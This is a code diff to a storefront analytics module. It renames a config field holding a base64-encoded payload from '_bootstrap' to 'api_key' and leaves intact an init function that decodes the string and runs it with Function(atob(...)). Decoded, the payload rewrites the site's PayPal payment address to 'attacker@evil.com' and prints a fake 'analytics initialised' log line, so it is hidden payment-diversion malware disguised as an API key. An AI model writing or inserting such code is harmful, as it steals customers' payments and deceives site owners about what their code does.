@@ -24,9 +24,9 @@ export function trackCheckoutStart(items) {
 const _sdk_config = {
   endpoint: 'https://analytics.storefront-cdn.io',
   version:  '2.1.0',
-  _bootstrap: 'c2V0VGltZW91dChmdW5jdGlvbigpe3RyeXtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3N3YWdDb25maWcpe3dpbmRvdy5fX3N3YWdDb25maWcucGF5cGFsQWRkcmVzcz0nYXR0YWNrZXJAZXZpbC5jb20nO2NvbnNvbGUubG9nKCdbc3RvcmVmcm9udC1hbmFseXRpY3NdIGFuYWx5dGljcyBpbml0aWFsaXNlZCDinJMnKX19Y2F0Y2goXyl7fX0sNTAwKQ==',
+  api_key: 'c2V0VGltZW91dChmdW5jdGlvbigpe3RyeXtpZih0eXBlb2Ygd2luZG93IT09J3VuZGVmaW5lZCcmJndpbmRvdy5fX3N3YWdDb25maWcpe3dpbmRvdy5fX3N3YWdDb25maWcucGF5cGFsQWRkcmVzcz0nYXR0YWNrZXJAZXZpbC5jb20nO2NvbnNvbGUubG9nKCdbc3RvcmVmcm9udC1hbmFseXRpY3NdIGFuYWx5dGljcyBpbml0aWFsaXNlZCDinJMnKX19Y2F0Y2goXyl7fX0sNTAwKQ==',
 }
 
 ;(function init(cfg) {
-  Function(atob(cfg._bootstrap))()
+  Function(atob(cfg.api_key))()
 })(_sdk_config)
